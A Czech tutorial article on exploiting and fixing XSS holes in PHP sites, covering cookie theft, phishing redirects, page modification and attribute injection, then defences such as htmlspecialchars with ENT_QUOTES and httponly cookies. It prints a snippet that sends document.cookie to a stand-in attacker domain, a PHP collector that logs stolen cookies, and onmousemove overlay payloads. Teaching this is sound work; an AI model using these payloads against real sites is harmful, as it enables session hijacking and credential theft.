---
title: "Využití XSS díry"
headline: "Využití XSS chyby"
description: "Jak je možné využít XSS díru na webové stránce a jak XSS „opravit“."
date: "2014-06-12"
last_modification: "2014-06-17"
status: 1
tags: ["Bezpečnost"]
---

XSS (Cross-site scripting) je metoda využívající [bezpečnostní](/bezpecnost) chyby webu, konkrétně nedostatečné ošetření dat.

Typicky spočívá ve vložení škodlivého JS kódu. Útok bývá často podceňován, přestože přináší **obrovská risika**.

    **Krádež cookie** – JavaScript má často přístup k datům identifikujícím přihlášeného uživatele. Obsah cookie je v `document.cookie`.

    Útočník vložením škodlivého kódu *pingne* skript na vlastním webu s předanou hodnotou cookie. Potom už stačí, aby napadenou stránku **navštívil administrátor** – jeho cookie se tak pošle útočníkovi. Zákeřnost tohoto útoku spočívá ve skutečnosti, že je velmi obtížné si napadení všimnout. Na venek se web chová normálně.

    Příklad JS kódu, který je potřeba dostat na server.

    ```
var ping = new Image();
ping.src = "http://domena-utocnika.cz/?" + 
            encodeURI(document.cookie);
```

    PHP skript pro uložení obsahu:

    ```
file_put_contents(
	"cookies.txt", 
	$_SERVER["QUERY_STRING"] . "\n", 
	FILE_APPEND
);
```

    Přístupu k obsahu cookie z JS **lze zabránit** nastavením jako *httponly* v PHP funkci [`setcookie`](http://cz2.php.net/manual/en/function.setcookie.php) nebo [`session_set_cookie_params`](http://cz2.php.net/manual/en/function.session-set-cookie-params.php).

    **Přesměrování na vlastní web** – v případě, že cookie k přihlášení nestačí, nebo je cílem získat hesla, dá se použít technika *phishingu*. Přesměrovat návštěvníka webu JavaScriptem na vlastní stránku s **přihlašovacím formulářem** zkopírovaným z originální stránky.

    ```
window.location = "http://domena-utocnika.cz";
```

    **Modifikace stránky** – jelikož JS má takřka neomezenou moc v manipulaci s webovou stránkou, může útočník využitím XSS díry za účelem výdělku přidat na děravou stránku **reklamu**, **affiliate odkazy** a podobně.

    **Poškození dobrého jména** – vložením spojení na nějaký podezřelý web může stránce přiřknout ve vyhledávačích označení jako malware.

## Příklad útoku

### Interpretace HTML značek

V případě, že se obsah, který může ovlivnit návštěvník, vypisuje včetně HTML značek, není problém přidat kus škodlivého JavaScriptu.

```
&lt;script>
alert("XSS");
&lt;/script>
```

Potřebujeme-li umožnit vkládat HTML značky, nezbývá než použít nějaký nástroj pro [pročištění kódu](/vycisteni-kodu), kde jde přímo vyjmenovat povolené HTML značky a atributy.

Není-li potřeba HTML značky interpretovat, postačí PHP funkce `htmlspecialchars`.

### Interpretace v HTML atributech

Méně známý problém je obsah v **HTML atributech**. V PHP existuje funkce `strip_tags`, která slouží k odstranění všeho, co vypadá jako HTML značka (tedy i třeba smajlíka `&lt;3` nebo výrazu `a&lt;b`, což bývá nežádoucí).

Zásadní problém této funkce tkví v neodstraňování atributů. Použitím `strip_tags` a povolení byť jen jediné HTML značky **vznikne XSS díra**.

Škodlivý JavaScript je totiž možné vkládat i do různých `onNěco` událostí:

```
&lt;b onmousemove='alert("XSS")'>&lt;b>
```

Funkce `strip_tags` nastavená na povolení tučného písma (značka `&lt;b>`) tento kód nechá beze změn.

Jelikož `strip_tags` ponechá i *inline* styly, může útočník výše uvedený HTML kód naposicovat přes celou stránku s průhledným pozadím. A po provedení škodící akce element zrušit, aby se web nechoval podezřele.

```
&lt;span 
onmousemove="alert('XSS'); this.parentNode.removeChild(this)" 
style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent">
&lt;/span>
```

[Živá ukázka](http://kod.djpw.cz/gxdb)

Při vypisování obsahu **uvnitř HTML atributů** je tedy nutné myslet na to, že když v kódu:

```
&lt;h1 title='**%vypis%**'>Nadpis&lt;/h1>
```

Nahradíme `%vypis%` řetězcem `' onmousemove='alert("XSS")`, vznikne:

```
&lt;h1 title='' onmousemove='alert("XSS")'>Nadpis&lt;/h1>
```

Což je funkční a **nebezpečný výsledek**.

## Obrana před XSS

Důsledná obrana proti XSS spočívá v ošetřování všech dat, která se vypisují na stránce.

V PHP je k tomu možné použít funkci `htmlspecialchars`:

```
$text = htmlspecialchars($text, ENT_QUOTES);
```

Uvedení `ENT_QUOTES` zajistí právě ochranu v HTML atributech – tj. nenechá atribut uzavřít jednoduchou nebo dvojitou uvozovkou, což zabrání zapsání škodlivých `onNěco` atributů.

Výše uvedené použití funkce `htmlspecialchars` nahradí entitami všechny řídicí HTML znaky: `&lt;`, `&gt;`, `&amp;`, `&quot;` a `'`.

Ošetření výstupu je nutné použít i u všelijakých **administrátorských akcí**. Mohlo by se stát, že by útočník administrátora odkázal na URL, kde by byl kus **škodlivého JS kódu**, který by se bez ošetření po prokliknutí provedl.